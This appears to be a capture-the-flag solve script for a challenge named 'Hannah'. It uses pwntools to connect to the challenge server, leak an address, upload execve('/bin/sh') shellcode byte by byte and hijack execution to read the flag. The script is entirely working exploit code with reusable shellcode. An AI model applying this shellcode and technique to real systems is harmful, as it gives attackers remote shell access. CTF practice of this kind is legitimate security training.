#! /usr/bin/env python3
##
# Created for the Hannah challenge
# By Amos Ng
##
from pwn import *


# Declare variables
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

with context.local(log_level="error"): 
    t = remote("128.199.98.78", 1701)

# Get Hannah's address
t.recvuntil("02440\n")
t.sendline("59")
hannah_address = t.recvline().strip()[2:]

# Set shellcode length
t.recvuntil("02440\n")
t.sendline("3092")
t.sendline("%d" % len(shellcode))

# Loop through shellcode
for c in shellcode:
    t.sendline("%d" % ord(c))
t.recvuntil("02440\n")

t.sendline("9929")
t.recvuntil("02440\n")

t.sendline("1312")
t.sendline(hannah_address)

# Get flag
t.sendline("cat flag")
t.success(t.recvline().strip().decode())